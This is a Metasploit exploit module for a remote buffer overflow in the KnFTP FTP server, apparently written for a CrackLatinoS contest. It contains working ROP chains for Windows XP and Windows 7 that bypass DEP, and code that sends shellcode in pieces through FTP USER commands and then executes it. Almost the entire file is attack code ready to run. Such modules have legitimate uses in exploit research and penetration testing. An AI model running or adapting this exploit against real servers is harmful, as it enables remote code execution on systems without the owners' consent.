#see the Description.
#Copyright (C) October 04th 2011
#Author: Javier Aguinaga (pasta) el.tio.pastafrola[at]gmail.com
#
#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::Ftp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;KnFTP FTP Server Multiple Commands Remote Buffer Overflow Vulnerabilities&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a vulnerability in the KnFTP
                application. The same by-pass DEP with AlwaysOn.
                 
                Built for the 10th contest of [C]racks[L]atino[S].
            },
            &#039;Author&#039;         => [ &#039;pasta&#039; ],
            &#039;License&#039;        => GPL_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 0 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.securityfocus.com/bid/49427&#039;],
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 0x300,
                    &#039;BadChars&#039; => "\x00",
                    &#039;DisableNops&#039;   =>  &#039;True&#039;
                },
            &#039;Platform&#039;       => [ &#039;win&#039; ],
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Windows XP SP2/SP3 Spanish (NX)&#039;,
                        {
                            &#039;rop_movs&#039; => [
                                0x77bf1d16, # POP EAX
                                0x41414141, # PADDING
                                0x77c07451, # LEA EAX,[EBP-10]
                                0x77bf2751, # EBP = ESP+C && JMP EAX <--
                                 
                                            # se ejecuta la carga de EBP
                                            # y despues carga en EAX el valor
                                            # EBP-10, esto es x el JMP EAX
                                             
                                0x77bef2c1, # ADD EAX,8
                                0x77bef2c1, # ADD EAX,8
                                0x77bef2c1, # ADD EAX,8
                                0x77bef2c1, # ADD EAX,8
                                0x77be95ab, # XCHG EAX,ESI # CMPS <-- ROBA
                                0x77c0620b, # MUEVE 6 DWORDS DE ESI A EDI
                                0x41414141, # JUNK
                                0x41414141, # JUNK
                                0x77bf22b6  # JMP $
                                ],
                             
                            &#039;rop_popeax_null&#039; => [
                                0x77bef519, # POP ECX
                                0x41414141, # PADDING
                                0x42424242, # JUNK
                                0x77bf1d16, # POP EAX
                                0x42424242, # JUNK
                                0x77c0f284  # LEA EAX,[EAX+ECX*8]
                                ],
                             
                            &#039;rop_popeax&#039; => [
                                0x77bf1d16, # POP EAX
                                0x41414141, # PADDING
                                0x42424242  # JUNK
                                ],
                                 
                            &#039;rop_writemem&#039; => [
                                0x77bef519, # POP ECX
                                0x42424242, # JUNK
                                0x77c12f02, # MOV [ECX],EAX
                                0x42424242, # JUNK
                                0x77bf22b6  # JMP $
                                ],
                                 
                            &#039;rop_jmpeax&#039; => [
                                0x77be68cd, # JMP EAX
                                ],
                                 
                            &#039;rop_changeeip&#039; => [
                                0x77bf1d16, # POP EAX
                                0x41414141, # PADDING
                                0x41414141, # JUNK
                                0x77be68cd  # JMP EAX
                                ],
                                 
                            &#039;place4payload&#039; => 0x77e1ac81, # .data msvcrt   
                            &#039;place4argumen&#039; => 0x77e1ab40, # .data msvcrt
                             
                            &#039;loop&#039; => 0x77bf22b6, # JMP $
                        }
                    ],
                     
                    [
                        &#039;Windows 7 Professional SP1 Spanish (NX)&#039;,
                        {
                            &#039;rop_movs&#039; => [
                                0x770c181f,
                                0x41414141,
                                0x77099871,
                                0x770abffd,
                                0x7709a5c5,
                                0x7709a5c5,
                                0x7709a5c5,
                                0x7709a5c5,
                                0x770ce0ab,
                                0x770c07d2,
                                0x41414141,
                                0x41414141,
                                0x770aac5b
                                ],
                             
                            &#039;rop_popeax_null&#039; => [
                                0x7709a984,
                                0x41414141,
                                0x42424242,
                                0x770c181f,
                                0x42424242,
                                0x770c040f
                                ],
                             
                            &#039;rop_popeax&#039; => [
                                0x770c181f,
                                0x41414141,
                                0x42424242
                                ],
                                 
                            &#039;rop_writemem&#039; => [
                                0x7709a984,
                                0x42424242,
                                0x770a3bdb,
                                0x42424242,
                                0x770aac5b
                                ],
                                 
                            &#039;rop_jmpeax&#039; => [
                                0x7709c441,
                                ],
                                 
                            &#039;rop_changeeip&#039; => [
                                0x770c181f,
                                0x41414141,
                                0x41414141,
                                0x7709c441
                                ],
                                 
                            &#039;place4payload&#039; => 0x77136C01,
                            &#039;place4argumen&#039; => 0x77136a80,
                             
                            &#039;loop&#039; => 0x77bf22b6,
                        }
                    ],
                ],
            &#039;DisclosureDate&#039; => &#039;Sept 19 2011&#039;,
            &#039;DefaultTarget&#039; => 0))
             
            register_options(
                [
                    OptInt.new(&#039;TIME&#039;, [ true, &#039;Delay between packets. (seconds)&#039;, 5 ]),
                ], self.class)
    end
 
    def exploit
        connect
        print_status("Sending eggs")
         
        address = target[&#039;place4payload&#039;] + 0x300
        payload.encoded << &#039;A&#039;*(16 - payload.encoded.length % 16)
         
        (payload.encoded.length/16).times {|i|
            i += 1
             
            buf  = &#039;A&#039;*276
            buf << [address - 16 * i].pack(&#039;<L&#039;)
            buf << &#039;A&#039;*4
             
            buf << target[&#039;rop_movs&#039;].pack(&#039;V*&#039;) + &#039;1&#039; # <-- byte corrido por CMPS
             
            buf << payload.encoded[payload.encoded.length - 16 * i, 16]
            sleep(datastore[&#039;TIME&#039;])
            print "="*i + " "*((payload.encoded.length/16)-i) + "> #{i}/#{payload.encoded.length/16} egg[s]\r"
            send_user(buf)
            disconnect
             
            connect
        }
 
        memory = target[&#039;place4argumen&#039;]
        keys = {
            memory+0x04 => target[&#039;loop&#039;],
            memory-0x38 => target[&#039;place4payload&#039;],
            memory-0x2c => 0x300,
            memory-0x1c => 0x40
        }
         
        print_status("Disabling [D]ata [E]xecution [P]revention")
         
        j = 1
        keys.each {|direction, dword|
             
            buf = &#039;A&#039;*284
                 
            if [dword].pack(&#039;<L&#039;).index(0.chr)
                ecx = 0x01111111
                eax = 2**32 + dword - ecx*8
                 
                target[&#039;rop_popeax_null&#039;][2] = ecx
                target[&#039;rop_popeax_null&#039;][4] = eax
                buf << target[&#039;rop_popeax_null&#039;].pack(&#039;V*&#039;)
            else
                target[&#039;rop_popeax&#039;][2] = dword
                buf << target[&#039;rop_popeax&#039;].pack(&#039;V*&#039;)
            end
             
            target[&#039;rop_writemem&#039;][1] = direction
            buf << target[&#039;rop_writemem&#039;].pack(&#039;V*&#039;)
                 
            sleep(datastore[&#039;TIME&#039;])
             
            print "="*j + " "*(5-j) + "> #{j}/5 egg[s]\r"
            j += 1
             
            send_user(buf)
            disconnect
                 
            #connect again
            connect
        }
         
        buf = &#039;A&#039;*280
        buf << [memory].pack(&#039;<L&#039;)
         
        load_arguments = 0x00403822
        ecx = 0x01111111
        eax = 2**32 + load_arguments - ecx * 8
         
        target[&#039;rop_popeax_null&#039;][2] = ecx
        target[&#039;rop_popeax_null&#039;][4] = eax
         
        buf << (target[&#039;rop_popeax_null&#039;] + target[&#039;rop_jmpeax&#039;] + [0x41414141]).pack(&#039;V*&#039;)
         
        sleep(datastore[&#039;TIME&#039;])
        print "=====> 5/5\r"
        send_user(buf)
         
        print_good("PAYLOAD INJECT SUCCESSFULL")
        disconnect
         
        connect
         
        buf = &#039;A&#039;*284
        target[&#039;rop_changeeip&#039;][2] = target[&#039;place4payload&#039;] + 0x300 - payload.encoded.length + 7
         
        buf << target[&#039;rop_changeeip&#039;].pack(&#039;V*&#039;)
         
        print_status("Executing shellcode...")
        send_user(buf)
        sleep(datastore[&#039;TIME&#039;]*4)
         
        handler
        disconnect
    end
 
end



